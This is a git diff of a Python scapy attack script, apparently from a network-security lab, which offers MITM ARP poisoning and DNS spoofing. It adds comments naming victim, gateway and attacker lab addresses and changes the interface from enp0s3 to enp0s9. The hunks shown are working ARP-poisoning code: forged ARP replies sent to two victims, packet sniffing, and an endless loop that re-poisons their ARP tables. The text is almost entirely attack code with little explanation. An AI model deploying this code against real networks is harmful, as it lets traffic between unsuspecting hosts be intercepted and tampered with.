@@ -8,6 +8,14 @@ import os
 import logging as log
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 
+# In enp0s9
+# MAC Address M1: 08:00:27:B7:C4:AF
+# IP Address M1: 10.0.2.5
+# MAC Address Gateway: 52:54:00:12:35:00
+# IP Address Gateway: 10.0.2.1
+# MAC Address Attacker (M3): 08:00:27:D0:25:4B
+# IP Address Attacker (M3): 10.0.2.4
+
 # The main method to be ran by the user of our script
 def main():
        typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
@@ -50,7 +58,7 @@ def arp_poison():
         arp1[ARP].psrc = ipVictimList[1]
         arp1[ARP].hwdst = macVictimList[0]
         arp1[ARP].pdst = ipVictimList[0]
-        sendp(arp1, iface="enp0s3")
+        sendp(arp1, iface="enp0s9")
 
         # Send ARP package to victim 2 of spoofed IP victim 1
         arp2 = Ether() / ARP()
@@ -59,18 +67,18 @@ def arp_poison():
         arp2[ARP].psrc = ipVictimList[0]
         arp2[ARP].hwdst = macVictimList[1]
         arp2[ARP].pdst = ipVictimList[1]
-        sendp(arp2, iface="enp0s3")
+        sendp(arp2, iface="enp0s9")
         
         # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
-        sniff(iface = "enp0s3")
+        sniff(iface = "enp0s9")
 
         # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
         while(True):
             # Send ARP package to victim 1 of spoofed IP victim 2
-            sendp(arp1, iface="enp0s3")
+            sendp(arp1, iface="enp0s9")
 
             # Send ARP package to victim 2 of spoofed IP victim 1
-            sendp(arp2, iface="enp0s3")
+            sendp(arp2, iface="enp0s9")
 
             # Timer
             time.sleep(3)
